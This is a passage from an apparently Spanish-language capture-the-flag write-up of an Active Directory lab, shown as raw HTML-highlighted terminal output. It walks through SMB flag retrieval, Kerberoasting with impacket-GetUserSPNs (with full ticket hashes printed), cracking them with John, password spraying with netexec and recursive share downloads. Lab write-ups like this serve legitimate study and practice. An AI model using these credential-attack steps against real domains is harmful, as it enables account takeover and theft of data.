</span></span><span class="line"><span class="cl">  <span class="no">Administrator</span>                       <span class="n">D</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">Nov</span> <span class="mi">15</span> <span class="mi">19</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mo">02</span> <span class="mi">2025</span>
</span></span><span class="line"><span class="cl">  <span class="no">All</span> <span class="no">Users</span>                       <span class="no">DHSrn</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">May</span>  <span class="mi">8</span> <span class="mo">04</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">16</span> <span class="mi">2021</span>
</span></span><span class="line"><span class="cl">  <span class="no">Default</span>                           <span class="no">DHR</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">Jun</span> <span class="mi">15</span> <span class="mi">22</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">08</span> <span class="mi">2024</span>
</span></span><span class="line"><span class="cl">  <span class="no">Default</span> <span class="no">User</span>                    <span class="no">DHSrn</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">May</span>  <span class="mi">8</span> <span class="mo">04</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">16</span> <span class="mi">2021</span>
</span></span><span class="line"><span class="cl">  <span class="n">desktop</span><span class="o">.</span><span class="n">ini</span>                       <span class="no">AHS</span>      <span class="mi">174</span>  <span class="no">Sat</span> <span class="no">May</span>  <span class="mi">8</span> <span class="mo">04</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mo">03</span> <span class="mi">2021</span>
</span></span><span class="line"><span class="cl">  <span class="no">Public</span>                             <span class="no">DR</span>        <span class="mi">0</span>  <span class="no">Sat</span> <span class="no">Jun</span> <span class="mi">15</span> <span class="mi">13</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">32</span> <span class="mi">2024</span>
</span></span><span class="line"><span class="cl">  <span class="n">ybob317</span>                             <span class="n">D</span>        <span class="mi">0</span>  <span class="no">Mon</span> <span class="no">Jun</span> <span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span> <span class="mi">2024</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="mi">12942591</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">10708580</span> <span class="n">blocks</span> <span class="n">available</span>
</span></span><span class="line"><span class="cl"><span class="ss">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> </span></span></code></pre></div>
<p>Obtenemos la 1era flag que está en el usuario ybob317 en la Desktop:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ss">smb</span><span class="p">:</span> <span class="p">\</span><span class="n">ybob317</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="no">Desktop</span><span class="p">\</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="n">ybob317</span><span class="p">\</span><span class="no">Desktop</span><span class="p">\</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">33</span> <span class="n">as</span> <span class="no">Desktop</span><span class="p">\</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mi">0</span><span class="o">.</span><span class="mi">0</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="no">Desktop</span><span class="p">\\</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
</span></span><span class="line"><span class="cl"><span class="mi">28189316</span><span class="n">c25dd3c0ad56d44d000d62a8</span></span></span></code></pre></div>
<p>Solicitamos TGS con este usuario en busca de servicios al que podamos tratar de romper el hash:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">impacket</span><span class="o">-</span><span class="no">GetUserSPNs</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="o">/</span><span class="ss">ybob317</span><span class="p">:</span><span class="n">ybob317</span> <span class="o">-</span><span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="no">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="n">dev0</span> <span class="o">-</span> <span class="no">Copyright</span> <span class="no">Fortra</span><span class="p">,</span> <span class="no">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">ServicePrincipalName</span>    <span class="no">Name</span>            <span class="no">MemberOf</span>  <span class="no">PasswordLastSet</span>             <span class="no">LastLogon</span>  <span class="no">Delegation</span> 
</span></span><span class="line"><span class="cl"><span class="o">----------------------</span>  <span class="o">--------------</span>  <span class="o">--------</span>  <span class="o">--------------------------</span>  <span class="o">---------</span>  <span class="o">----------</span>
</span></span><span class="line"><span class="cl"><span class="no">FTP</span><span class="o">/</span><span class="no">FileServer</span>          <span class="n">file_svc</span>                  <span class="mi">2024</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">23</span><span class="o">.</span><span class="mi">726085</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>               
</span></span><span class="line"><span class="cl"><span class="no">FW</span><span class="o">/</span><span class="no">ProxyServer</span>          <span class="n">firewall_svc</span>              <span class="mi">2024</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">32</span><span class="o">.</span><span class="mi">710125</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>               
</span></span><span class="line"><span class="cl"><span class="no">HTTP</span><span class="o">/</span><span class="no">BackupServer</span>       <span class="n">backup_svc</span>                <span class="mi">2024</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">49</span><span class="o">.</span><span class="mi">476511</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>               
</span></span><span class="line"><span class="cl"><span class="no">HTTP</span><span class="o">/</span><span class="no">WebServer</span>          <span class="n">web_svc</span>                   <span class="mi">2024</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mo">04</span><span class="o">.</span><span class="mi">569417</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>               
</span></span><span class="line"><span class="cl"><span class="no">HTTPS</span><span class="o">/</span><span class="no">MonitoringServer</span>  <span class="n">monitoring_svc</span>            <span class="mi">2024</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">18</span><span class="o">.</span><span class="mi">511871</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[-]</span> <span class="no">CCache</span> <span class="n">file</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">found</span><span class="o">.</span> <span class="no">Skipping</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="vg">$krb5tgs$23$*</span><span class="n">file_svc</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="o">/</span><span class="n">file_svc</span><span class="o">*</span><span class="vg">$42d852306a242603a41f33fb72724203$9097b5d6979554217797c19041d28c3f06ca9fcc78d0615f814d84dd9eb3e752c5da75b222b7f61df4c458cf4952b15027d58da40b581f1db6953b056dd642c92cbb98d23d7379eae22e9608bb3551d63c5c4e485e8adf31c354505c4a47f20e1cf972a7ccdc594f4f08b6199c13160eae0fc83e67fb00597b9b7659ea737aa5ebd208aa24528221de5acf3e2a138e24cbd8ad4194d2398bbcce9a48a674b561b92037f5b88b427989b6442212de791e7a96846df42c9579aaa21969475c17a6f9fce1d6189d861e77107301abdeae5f920a59822961c24fafd5b6b70c4bf99421753e071a1ed6d3aa99233562ea5aca43928a37c70b73587f4d28a5a030af5fd79cffd03f562ad6f17e2a1eb70aa5ca7f9cde39cc660bebeaf03cc68e8ffc660ee7552b069bb223ea4a8c3ed4c32d05a12ba196d11411802a183977ba42cb8e0b34b92b55717bb8280241d9335cb76f8f70387a803a128b25f4a76604f173deeabe53ae973143394e8db597deb22932f9212941a6cd06607836c7db3a445852945712669ec965b745016c963c10dea68658b721beb14e3bbe57393788c274a9224a6974ba68d5efced7d3622db9be0dd9059e98ca5e425b7d475cd7c6a0def1f0c76a4227ce5c06d52e3387fe6cbeebe7c048874a82120b63f85bbfbfd155a18dd4fa710088e18467db3ae424134a21df00f410a07eb3a804ef0928a4bd34a546bba4c66e2a8c3f9af04f2a084fb572b80440ad523f00964489b8c57e94b3b6b95f566950831aeadeb21c45de85845d57953b0eb62b9fe17a8afd2f54579b411e33fef98904356dec0fb0ecfd89695581d741440313db6537c37f958114883fea30dddfe7c78215f4d74e390e52402005fb3682924e209f634761bfbab64e98a56b325f32a2221bef85aecebea23fd9d13e71339dce700468021c049b9cfe2600267c3c6bde88eb6b5319a606bb10bc274f27b4fe833cf6f071cbdf580c6abfc80f5fee4bb8fa9c64ee92d99bbadcd69bb0d8411381e8dcfe24e8b0ba8690a0f2b74e44812d7632e0f58ee139c3590262ddcb5ed199de695a401586f15e906daafe72fdcf0aa7318742b506268aca7956fa182cead0e1c352cfcbbf71fbebabf511305ba220ec817d69ce0af31a305d471efea6b751236dddfa03d5a3e9a8d4f85998cff18c4c8af95c93e7a10f08b05999afc0991a04a122a2ef69dd019c2cd787261b27bd62afd78918863e95a02cade21cf7ee1b001360712e6246ba4200610c5fc19e444dde3f836b9308df034776b7a6ff51ebd7ea54ce1c0998d25608ae2282acb020432bba273d30eab34665c022e041e9bbc815a5e5df6c77f1b301218614f907d05105f37555bd8c5f6c1b727192cd31ea77d7275e17021555ad275a0f8d73735cba0b83388195bb05179d66af13afd5c49e19230793443aea6bda66ef9ec00f7c3e7879d8f2e1b88faaf08ccff89cb60c8f14b9155c3d0e17ac2fc4</span>
</span></span><span class="line"><span class="cl"><span class="vg">$krb5tgs$23$*</span><span class="n">firewall_svc</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="o">/</span><span class="n">firewall_svc</span><span class="o">*</span><span class="vg">$d69789c886b3ea5f5fc65fd550725a95$66aa967461d9719ffa6f57d58830bdd539d74bf33795ee622360d0765dc71edf9d329d7c2874b99064cdc65180c094dc52167f09ab32f367c85fb87a1ab1c0e179523d8a9fbf0f5141460f83cb427e84f5c4122b294c651d27d39ab7e06243a9b3a733a571e7370eabd6f81d29e3d50cb370bcdcb912dcb0401a7da0b2c4cd91a10358a29e1ca69aa5698218b125d820c1508d40ff626bef411f01aa117341958d236693940b526d3acc721ce11c44dfed506320e22218ee1c4fbe35a87815f71edf3d809e6f48e6b6001f77a2f0adfed541da1b9d458b0c2bf91b9921f9af5b85c410b357f6192739799b5cb9c3288a75c54b7223d081643b3a56b6a0c3f7ab27ee8f5737e489b6d71f50c29ff1c5283a6ced12f64dd222b66bb9a629e4aefc610b66ad9a2363602b8a4e5afa43935fdbbee6dcd7807873fd9f6e487dd7ae4fbae5d49a57fc69b4a1c94d6ca3a9fc90a9329089f1fc239fde5dfc8eef566066ba45797914c9400b984ed3d535a7015a978c5ef8bcd75d03a6979deaa5291599a250d1cd5048e666806608b13811a99c9649f90bac667f83fe742f663a50d904654a6b9b67addaf691c1ff845bb41d2f99e45d39e0821a3ed404e4014df8e67d2ca939fd4a1fb64cbf8c1e7e3045beb2ac724b8d0fe8456871d346704f2da9a2f02fb8d648a3d74f654384428fb6ff3ff2b6ceee9fe3fe2b6cf9a127a3b18ad67d452cda668e5dd3cb1248af566b0c574986cb715b2b1cab91b3c39d6cda4e5343b23389fe23bdbe0ee6d28de187c33f61ae7f90a3d97b246c97b8f20372c0baa98c8d4d0791c1698cd1882f930be88c9b1d93cba26cfaf08c1d9403430cf2ef403402d15c799da311cddbd1dc7c995e5dd0cc6ad1b6c4361606784fbad093fdd6a1d593b4b895f95b8e9f6630a8da58986a2b43a43f90fa39fae10f6545c4f59625b18a94ee9e74da14cf4bcc3fe2cdd14afc422547aae2233318d7d0aadca1c164102ab65c28ca2e8dd6d5cb15c4613f1d06d5239044d179b319a3d95461f7f39133b99deaade34b72efa7c922b2138953bac7c3c7dd3fd97e0eaf0827786e874d3a55ae5bfbd11ce1dacc9fa34dbd96430a99f24465802c234c263337cbf64cb87d271a28af4b77e338afc6477035d5d5d8de2be4d03289cfd70e977c8c6b8682f7760d2f4faf57ffc8bd7793335922980d7f0fbfb2a42bb2e17608a21c053d5b5f19cd8115592b1ccfdca41941ade70976b40e04e6803605ff56d4dbd4c03e0f86d0f61ffaeb7bdf748ed91b798de02e9453c5e9b5ae3cc2aa74c5f2669126f6e528c4e8b3aa49e614fff5febbe4a41cd5b3f8b0e54ad8af0c635f12749c7c5a5165000c17d4e5ac4b9cbac1f306e5370397959e1095c2d816ad7107ff4c180b139fc04282b2d095d57d9a365638391cc5455ad86e282137d92d016fc089daf626f7ffa36967e0915ea269137e05f1b89efc94240f4a979a29f5817f770f66</span>
</span></span><span class="line"><span class="cl"><span class="vg">$krb5tgs$23$*</span><span class="n">backup_svc</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="o">/</span><span class="n">backup_svc</span><span class="o">*</span><span class="vg">$1acc90ea7b61c05cd283660b6a008a0b$19a41319201e4519d030d8365a1d4b89e3d07dabce2cf47bc599a476d2f27b3984f42d111e0ebec2b76815fff9d772ece13df5447301a8b428768f2270bc1e87bd63e3fe300e75af3c38030ba5f99c8b615d0b736a52a5e630c04e7506841cac31eb698c962f4a42094e32da64c179cb15afb26f81699f0ceb877da822abfea7f2448698aaf8168b8944e8dcce035222b1bfd64f32cb94184a3565f49cc3c7ae3eeb9be519f0f30bc7eabd2d8a813aa9a9d89c7d484a518e9eb1c79f4ca5f82cbed995cf4586546e87d9125ba903a3018ccaadeb5784be124342db6815af718f042e94acbfaaf952d286fcb4f921f7d718d53a6d0f09497f9eb3e3227d73838fda3ea13b56bf32ead1eb4799d3ecb4aa0a27ee81e9eb55e8edaf8f93dd5be7398d8505f820c907ca650966096d44660c99b0e08e304973c13da07bae7b55c2d12b7217e077c7bf28fe7e0750d5ef6d195fb06ae663717e50bc40a923e30c4d30fdf18642c1dfa14fd3bdab85c80579a50e7c8ce6802985efafc7a9b4e74f3c3ed326e3c54ae34f5850e9e22e8c228490506e63e55c38dc38d68ea23fc4dd347cf7c37a76e9ad89eb350e44778a577c0ece73c848e3af28a7cda0149caf49c6c17df1837a22fe80580840722469b1f31ef14494128db15459c6b1b9d04f5b464d57b901fe05a856493eea04c4098a9a91263551f23bb0f86d97c7092676653ed2d1c0e3983cd425cd892eaa2d8a1ec707a9f0b4ec23f58ed5272b183417cc614ebb3683ffeebdca9c03802cf0847218671390b87e1c23dc44cb93b41675caeab4454e4faf7b0161c7da9c4aa6d3337c46ab3e51c26a9e49122417d2ec29d661ebbd214bc90eebfe8029fe989497a0afae4d96c3f0609d33388b9ff3c2668fbdb2399b46f1cf733bcaeaf53463c8c859f623601f30adf236661d4cc5668cf7188610a07f6be07a806dff3541cf42537a1cae29c5e344dfa47ca003d6ff9abb662734625b60518e0077a353d4a9a06881cf277def036487d41eae8d4d862316d68a314d813fad4371ebe0fd814012447c48310cede4eba6008daa4e2612df81e77e244a3d2461c4efa2b429369936e1f7da824702864db9adfc9cd2b073ed47154560ba67b679c07408195b1490909c67dffff14b181c2c1cf3a6c2e8f3bbd6b3027f610962b94e90281537eb0dc1c97355feb995098ac9d40ef976d6aa8a287488463a5b1d1d1881ca3049fb57c5e5bb6efeb51ac1a012f91c08b14d7f1551ce82ab41b6d8bb04459f5d53af4c011c667b6baf70da64bbd8b10aa9984277cfccacd8c65b171b8ffb3ed9faea18401bce82563a01c536e2afa1a342d8e92895c56936c64fb5254611fa3554ed268a665965516985fced15a30052e72aca16fb4d8c2ed77f7413add772715809cd04a4e5d09b905789ab9aabdd09f9f06f842cd67a50040fffe245d8e3cbc5e231109ec573ad9682c3e95fa0a99afdf0ec2a1838ae90</span>
</span></span><span class="line"><span class="cl"><span class="vg">$krb5tgs$23$*</span><span class="n">web_svc</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="o">/</span><span class="n">web_svc</span><span class="o">*</span><span class="vg">$7dedb3425113233d19a0969b5f658b3e$218d3ea9ca0ae5c01ad4e672485ccd2aad8bb7b39a465ce6399cd1ea755ce7818fe9b08fb50347a984cc14cdd9ff1e7736a57c3f1a78f0c221a9ce5f16aeeba2f9620a9daa6487961c38138511a23ce296af437b60d3cdadbe88bd9cf63b690304e72c8bf83f366af5155b598ff04a9fcd4123ed507b4b39d77443ae3ba3f1a3f2a9f21a57840e3f9a3b92dc91b75b13e4aaf04769917aa4ed4bfbc89629cd26041e8cf063c080ea14b3a9fa86845e4cc6e2c5460686c80d4166801905efda77c363344f2fc471524967df0f2e6179e98143083135ef13471a88df6a74c3d7bd719fa607078e76696f447ad79fefa98681ade50bc1002fd7d47b59c11e91a55853dd2af1d213742b6333435629e43755f0ce4d31b6d836c045137706690eb4ec92eafb1e0b41d1e31815fcfde97660ed4462bde17e50c2f381c348fd57d59c892f4160dd6325b76264104bba49073d1237da09d7f1fb87ff45d5b2d482f09f70154db8cad680274928c1e60668a9b276cf22ee78fc80bf0f4b6e54be6b3ae06527d73db0dbfee39a8f000eb6fa80a7670ae470d7a674da82cdb518023ad6f54f2ef5991b99158201ab5b10f501277cc39ae3deefd271c4eac3f8d66a5948e709baf61a22eaaabebe8522786a9ef5b369d8c14389a359418c4171d533fbe0aa9fddc1ddcd6b7f3968e5054a034f3fa167a2e96e06bebe0da88bd69acb205eab2e1927a33acf9b8b2ae4c174a9dfc79673fb3bc95b93d53cd58294a61361a5b78c3fadca460b5d2b75029bd2894735cc4febb6d766cbb36caf3aa99d652b4f5268d3e8ef4b1b96f651a935c84c847aac01393e92a745e05f255b6060528df7599d8d63a2da6ccc2894b9c8b445be17490f2f4fa6037e0b5b908111cc1dfa4b50dd5a2e7ee5a028d8afc3f510fbd6116e8f7b121e898b0d1219e40395b3109b650bd3c85144c278b4a1b122f36b24089b59610b31dee71a1e39a3f246fe8cef24796065d788bdc823a8dce355a38fbeafbc07b31e7f7fdda05d2a8fa41c26f53c3f5c1cc4c523e96fce2d9c812e9661aee2088b4295071ae3fa6fd97c92d3fb9287baa73a956e80588cdf0b9aa6f0f804b3d38b5d84ac92ec960fdfc1a801b9e682d694619ea269aedffc89a7a1213bdcdc2144b3c9a7f9891928e7e6588bffadf7f312a45d04988bd90251c6f89900b5a2be9a7cb53b2d98659199cfb934349d786624cc5128619822b93a61c37a6846e88a1a23434106e5090a59346f45bb2df7f9a43d9eb70453c259d27ff1d8902a115a5559aa476c45d64f9206f37e5ab726ab7fd84dfec8182ece0c84a4b8de236e2071f1c8bf516feff4b89ee32fc5316dae4e4b875340f5e9296ffbfacf4795160f87334d6cac37659b5848030e1e6860aaf2df415886a642729f2ab2429bb6309e0eb8e3492b8a0d7bae9b1712c0810f62c9c18cb02f535a38e9338c74d75f296be9ba1f2d6cf2ca776c99f1c99ea449de</span>
</span></span><span class="line"><span class="cl"><span class="vg">$krb5tgs$23$*</span><span class="n">monitoring_svc</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="vg">$SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="o">/</span><span class="n">monitoring_svc</span><span class="o">*</span><span class="vg">$70a70417cf3d79b95303bffe67cd8c52$45705237f626fdfc67d83464ea9be29d6a222add5869bbee2b0dd8acdd251e227539ed9af28135564810fbe5f8ab73ac03372cc3e603010d096508261252a104628efa87fe99fa88eb4ce42586cabb5ceb41a051b23e8f2fae478be393a102df2486979a4b4ae5e996e361a9f00c12033c6ec6a5ebfe53e9adbefb9b48b6f648fc0a23849e53a77ce7b924b547d7caa0a116f148efab552ba36a8945639299ec3ff4c7d8b35aeadae6a9d0fa909ed475e689f20dc1f081a7d001295b78fe152f7db1ead4a1bf29349c0dc867bf08e9d0fc8bf553e9b392aeb357ff79d652a47c264d8a503330f618e5f3ea41c1fa48c046118974925f8a28784e75d756969c046d0f4bd6393e6e3685fc946d2b70e98ea53d1b192333534dc9ea651de98ef37bb83306628a77f4350b9a0530b4c0e947ce902129e1dcf483b8b8e472681d82595bde46097fd9e6f111aa65015d736c046011b63509757904ac679f7eecfc52c66647600b35560be44236bbea0d80aec3eb0fa496e2b7bc8296fd642eabb50cfebb224db505fdef6075ccea0e87e93ec9225c3581dd5639bd3875a95f5abe2ca7bb6803dc4bf773ecdea04b2c8fd4bfda650b5f9e193f7570396113e47657ad6d1a36ec5925d5b3f7873994569d1528d37e808e67a8a07e843a7f507433411ea91e6e55f0d744f6a15523b787f6074a4072f27800482ca36217ab3b47ea99552d81f8fc47d1ffb9f1d79f7d0da0d293c4d67b3134c55f08e6881431e55f0959cd16d6c9a7c09b8074e12d59040e653a22fa8176d9d263506ae3626204a1f6c95782aec73f2921b573adced6d7b6664be5de3a1a6e341d6b45c756c671d1e96ba663df7cd829d24eb16358da70a307a669096d301029dc22b7b4f7dec36b3205a357a1a45fd037de584462e49602777789755d661655bbb15e89ecb82df88aa37c6b89b296c6e5fca03360a2b5a6d94b62eb0a1ce6937fb13eb566e3a7af4fb39382201804d06dd711dda505880b090d3bc92ea53c2187f55ac928802d777be4f1c9b58a4e0f8b4a947983ed5118736608904905813374b40640aa20a090dc191862af415f3363ab364ab4edb31af788f2468f1cf0a5e23ae6af0470840b4c39f783f854ebd998a84d50ca8df3ebfdddd00d02694986241adcbee7824f434f1b5c1a299e6f29e7b0ffe5ec231a8cdcfb1bc7d99014f92b009d88a33a94b72f5eef5993fb0a3031565ee1209ac9afa0662eff8b2c9352bda6541043b0ce9dd3ec334a74fa0cecee0bdd715bf27a75c6c056a8db841e2d125a192378b01ae8bef612cb632895f09b1785b44245b4e56810bebbe3c67841a9d5cb7b9df1c26d4594a08e75ae4a0722309f72f35bae058d6b1f632c540d3f3083ecb24046bb741720cc0692c1fe09d7361eea6e3730d889dfc83fbadd57fb460569c4f872e8a83e92dda3f641bd2a197290aa4834cdec3062302954120e76db5be5512fb728b1f2eeb269</span></span></span></code></pre></div>
<p>Tratamos de romper los hashes con John:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">john</span> <span class="n">hashes</span> <span class="o">-</span><span class="ss">w</span><span class="p">:</span><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="no">Using</span> <span class="n">default</span> <span class="n">input</span> <span class="ss">encoding</span><span class="p">:</span> <span class="no">UTF</span><span class="o">-</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="no">Loaded</span> <span class="mi">5</span> <span class="n">password</span> <span class="n">hashes</span> <span class="n">with</span> <span class="mi">5</span> <span class="n">different</span> <span class="n">salts</span> <span class="p">(</span><span class="n">krb5tgs</span><span class="p">,</span> <span class="no">Kerberos</span> <span class="mi">5</span> <span class="no">TGS</span> <span class="n">etype</span> <span class="mi">23</span> <span class="o">[</span><span class="no">MD4</span> <span class="no">HMAC</span><span class="o">-</span><span class="no">MD5</span> <span class="no">RC4</span><span class="o">]</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="no">OpenMP</span> <span class="n">threads</span>
</span></span><span class="line"><span class="cl"><span class="no">Press</span> <span class="s1">&#39;q&#39;</span> <span class="ow">or</span> <span class="no">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="nb">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="n">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl"><span class="no">Password123</span><span class="o">!!</span>    <span class="p">(</span><span class="sc">?)</span>     
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">56</span> <span class="no">DONE</span> <span class="p">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">15</span> <span class="mi">19</span><span class="p">:</span><span class="mi">48</span><span class="p">)</span> <span class="mi">0</span><span class="o">.</span><span class="mo">0177</span><span class="mi">9</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">255181</span><span class="nb">p</span><span class="o">/</span><span class="n">s</span> <span class="mi">1211</span><span class="no">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">1211</span><span class="no">KC</span><span class="o">/</span><span class="n">s</span> <span class="o">!!</span><span class="mi">12</span><span class="no">Honey</span><span class="o">..*</span><span class="mi">7</span><span class="err">¡</span><span class="no">Vamos</span><span class="o">!</span>
</span></span><span class="line"><span class="cl"><span class="no">Use</span> <span class="n">the</span> <span class="s2">&#34;--show&#34;</span> <span class="n">option</span> <span class="n">to</span> <span class="nb">display</span> <span class="n">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
</span></span><span class="line"><span class="cl"><span class="no">Session</span> <span class="n">completed</span><span class="o">.</span></span></span></code></pre></div>
<p>No sé cual hash rompimos por ende procedemos a probar todos los servicios:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="n">netexec</span> <span class="n">smb</span> <span class="vg">$target</span> <span class="o">-</span><span class="n">u</span> <span class="n">svc</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="nb">p</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">file_svc</span><span class="p">:</span><span class="no">Password123</span><span class="o">!!</span> </span></span></code></pre></div>
<p>Procedemos a enumerar los servicios smb y descargar los ficheros recursivamente:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="vg">$target</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;file_svc&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;Password123!!&#39;</span> <span class="o">-</span><span class="n">M</span> <span class="n">spider_plus</span> <span class="o">-</span><span class="n">o</span> <span class="no">DOWNLOAD_FLAGS</span><span class="o">=</span><span class="no">True</span>
